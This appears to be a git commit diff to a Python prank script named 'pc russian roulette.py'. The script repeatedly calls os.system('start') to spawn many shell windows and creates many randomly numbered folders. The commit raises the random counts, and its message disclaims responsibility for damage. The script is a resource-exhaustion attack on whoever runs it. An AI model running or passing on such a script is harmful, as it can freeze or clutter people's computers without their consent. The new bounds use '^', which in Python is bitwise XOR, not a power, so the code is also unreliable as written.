c94750ff8790f86552e4fc9cf712b13310bd142c
li7wak <ahmadsamso89@gmail.com>
2025-06-06 22:58:42 +0100

    Update pc russian roulette.py
    pls run this file on a virtual machine i am not responsible for any damages happening to ur pc

--- pc russian roulette.py
+++ pc russian roulette.py
@@ -1,12 +1,12 @@
 import os
 import random
 
-num = random.randint(1,1000)
-files = random.randint(1,1000)
+num = random.randint(1,1000^9999)
+files = random.randint(1,1000^9999)
 
 
 for i in range(num):
     os.system("start")
 
 for x in range(files):
-    os.system(f"mkdir {random.randint(1,9)} ")
+    os.system(f"mkdir {random.randint(1,9^99999999999999999999999999999999)} ")
